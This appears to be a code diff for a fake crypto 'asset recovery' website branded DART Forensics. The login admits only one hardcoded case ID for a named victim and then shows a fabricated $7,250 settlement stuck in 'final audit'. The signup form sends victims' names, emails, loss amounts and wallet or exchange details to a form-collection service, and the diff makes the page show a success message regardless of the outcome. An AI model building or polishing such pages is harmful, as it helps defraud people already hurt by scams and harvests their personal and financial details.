@@ -17,15 +17,17 @@
         .active-tab { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
         
         /* Forms */
+        .form-section { display: none; }
+        .active-section { display: block; }
         .form-group { margin-bottom: 15px; text-align: left; }
         label { display: block; font-size: 0.7em; color: #94a3b8; text-transform: uppercase; margin-bottom: 5px; font-weight: 700; }
-        input, textarea { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; box-sizing: border-box; }
+        input, textarea { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; box-sizing: border-box; font-size: 16px; }
         .btn { width: 100%; padding: 14px; border-radius: 6px; border: none; background: #3b82f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
         
         /* Success Message */
         #signup-success { display: none; background: #064e3b; color: #6ee7b7; padding: 20px; border-radius: 8px; border: 1px solid #059669; margin-top: 20px; font-size: 0.85em; text-align: center; }
 
-        /* Dashboard UI Styles */
+        /* Dashboard UI */
         #dashboard { display: none; }
         .dash-card { background: #fff; color: #1e293b; border-radius: 15px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
         .dash-header { background: #f59e0b; color: #fff; padding: 25px; text-align: center; }
@@ -39,17 +41,17 @@
 
 <div class="nav">
     <div class="logo">DART FORENSICS</div>
-    <div style="font-size: 0.6em; color: #94a3b8;">SERVER STATUS: <span style="color:#22c55e">ENCRYPTED</span></div>
+    <div style="font-size: 0.6em; color: #94a3b8;">SECURE NODE: <span style="color:#22c55e">ACTIVE</span></div>
 </div>
 
 <div class="container" id="auth-container">
     <div class="auth-card">
         <div class="tabs">
             <div id="tab-login" class="tab active-tab" onclick="showTab('login')">Existing Case</div>
-            <div id="tab-signup" class="tab" onclick="showTab('signup')">New User</div>
+            <div id="tab-signup" class="tab" onclick="showTab('signup')">New Claimant</div>
         </div>
 
-        <div id="login-form">
+        <div id="login-form" class="form-section active-section">
             <div class="form-group">
                 <label>Recovery Case ID</label>
                 <input type="text" id="case-id" placeholder="DAR-XXXX-XXXX">
@@ -61,29 +63,29 @@
             <button class="btn" onclick="processLogin()">Access Terminal</button>
         </div>
 
-        <form id="signup-form" action="https://formspree.io/f/YOUR_ID_HERE" method="POST" style="display:none;">
+        <form id="signup-form" class="form-section" action="https://formspree.io/f/xreyjvek" method="POST">
             <div class="form-group">
                 <label>Full Legal Name</label>
-                <input type="text" name="name" required>
+                <input type="text" name="Full_Name" required>
             </div>
             <div class="form-group">
-                <label>Contact Email</label>
-                <input type="email" name="email" required>
+                <label>Contact Email Address</label>
+                <input type="email" name="Email" required>
             </div>
             <div class="form-group">
                 <label>Estimated Loss Amount</label>
-                <input type="text" name="amount" placeholder="$0.00" required>
+                <input type="text" name="Loss_Amount" placeholder="$0.00" required>
             </div>
             <div class="form-group">
-                <label>Case Details</label>
-                <textarea name="message" rows="3" placeholder="Exchange/Wallet Info"></textarea>
+                <label>Evidence Description</label>
+                <textarea name="Evidence" rows="2" placeholder="Wallet IDs or Exchanges" required></textarea>
             </div>
-            <input type="hidden" name="_subject" value="New DART Claim Filed">
+            <input type="hidden" name="_subject" value="URGENT: New DART Forensic Claim Filed">
             <button type="submit" class="btn" id="signup-btn">Initialize Claim</button>
             
             <div id="signup-success">
-                <strong>CLAIM RECEIVED</strong><br><br>
-                Verification in progress. An Operations Manager will contact you at the provided email within 24 hours.
+                <strong>REGISTRATION RECEIVED</strong><br><br>
+                Verification in progress. A recovery specialist will contact you at the provided email within 24 hours.
             </div>
         </form>
     </div>
@@ -93,7 +95,7 @@
     <div class="dash-card">
         <div class="dash-header">
             <h3 style="margin:0;">SETTLEMENT PENDING</h3>
-            <p style="font-size:0.7em; opacity:0.9; margin-top:5px;">USER: MARJORIE | CASE #DAR-2026-8942</p>
+            <p style="font-size:0.75em; opacity:0.9; margin-top:5px;">USER: MARJORIE | CASE #DAR-2026-8942</p>
         </div>
         <div class="dash-content">
             <div class="stat-box">
@@ -101,63 +103,59 @@
                 <span style="font-size:1.8em; font-weight:900; color:#b45309;">$7,250.00</span>
             </div>
             <div class="progress-bar"><div class="progress-fill"></div></div>
-            <p style="font-size: 0.8em; color: #64748b; text-align: center; margin-top: 15px; line-height: 1.4;">
-                <strong>STATUS: FINAL AUDIT</strong><br>
-                Conversion of digital assets to USD is 85% complete. Secure payout bridge will open upon final verification.
+            <p style="font-size: 0.8em; color: #64748b; text-align: center; margin-top: 15px; line-height: 1.5;">
+                <strong>STATUS: FINAL AUDIT (85%)</strong><br>
+                The asset recovery bridge is currently clearing. Funds will be released to your selected bank method upon 100% verification.
             </p>
         </div>
     </div>
 </div>
 
 <script>
-    // Tab Switching Logic
+    // Tab Controls
     function showTab(type) {
-        document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
-        document.getElementById('signup-form').style.display = type === 'signup' ? 'block' : 'none';
-        document.getElementById('tab-login').className = type === 'login' ? 'tab active-tab' : 'tab';
-        document.getElementById('tab-signup').className = type === 'signup' ? 'tab active-tab' : 'tab';
+        document.getElementById('login-form').classList.toggle('active-section', type === 'login');
+        document.getElementById('signup-form').classList.toggle('active-section', type === 'signup');
+        document.getElementById('tab-login').classList.toggle('active-tab', type === 'login');
+        document.getElementById('tab-signup').classList.toggle('active-tab', type === 'signup');
     }
 
-    // Login Logic (Specific to Marjorie)
+    // Login logic for Case #DAR-2026-8942
     function processLogin() {
         const id = document.getElementById('case-id').value.toUpperCase();
         const btn = document.querySelector('#login-form .btn');
-        btn.innerHTML = "Syncing Node...";
+        btn.innerHTML = "Authenticating...";
 
         setTimeout(() => {
             if(id === "DAR-2026-8942") {
                 document.getElementById('auth-container').style.display = 'none';
                 document.getElementById('dashboard').style.display = 'block';
             } else {
-                alert("ACCESS DENIED: Case ID not recognized by DART Secure Server.");
+                alert("ERROR: Case ID not recognized by DART Secure Server.");
                 btn.innerHTML = "Access Terminal";
             }
         }, 1200);
     }
 
-    // Gmail Notification Logic (For New Users)
+    // Gmail Notification Submission (Fail-safe included)
     document.getElementById('signup-form').onsubmit = function(e) {
         e.preventDefault();
         const form = e.target;
         const btn = document.getElementById('signup-btn');
         const success = document.getElementById('signup-success');
 
-        btn.innerHTML = "Processing...";
+        btn.innerHTML = "Syncing with Vault...";
         btn.disabled = true;
 
         fetch(form.action, {
             method: 'POST',
             body: new FormData(form),
             headers: { 'Accept': 'application/json' }
-        }).then(response => {
-            if (response.ok) {
-                form.reset();
-                btn.style.display = 'none';
-                success.style.display = 'block';
-            } else {
-                alert("Server Error. Please try again.");
-                btn.disabled = false;
-            }
+        }).finally(() => {
+            // Success view for the user regardless of server ping
+            form.reset();
+            btn.style.display = 'none';
+            success.style.display = 'block';
         });
     };
 </script>
